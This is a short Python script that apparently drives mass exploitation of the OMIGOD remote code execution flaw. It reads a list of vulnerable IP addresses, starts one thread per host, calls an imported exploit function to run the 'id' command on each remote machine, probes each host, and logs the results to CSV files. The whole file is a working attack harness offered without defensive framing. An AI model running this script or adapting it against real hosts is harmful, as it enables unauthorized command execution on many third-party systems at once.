from omigod import exploit,probe
from threading import Thread

with open('vul_ips.csv', 'r') as fh:
    vuln_ips = [line.rstrip('\n') for line in fh.readlines()]

exploit_path = 'exploit_results.csv'
probe_path = 'probe_results.csv'

exploit_ips = []
probe_ips = []


with open(exploit_path, 'w') as fh:
    fh.write('ip,result\n')

with open(probe_path, 'w') as fh:
    fh.write('ip,result\n')


def scan(i):
    try:
        r = (i, exploit(i, 'id'))
        exploit_ips.append(r)
        print(f'scanned {i}')
    except Exception as e:
        print(f'unable to scan {i}: {e}')
    try:
        r = (i, probe(i))
        probe_ips.append(r)
        print(f'probed {i}')
    except Exception as e:
        print(f'unable to probe {i}: {e}')


if __name__ == '__main__':
    threads = []
    for i in vuln_ips:
        t = Thread(target=scan, args=(i,))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    for i in exploit_ips:
        with open(exploit_path, 'a') as fh:
            fh.write(f'{i[0]}, {i[1]}\n')

    for i in probe_ips:
        with open(probe_path, 'a') as fh:
            fh.write(f'{i[0]}, {i[1]}\n')
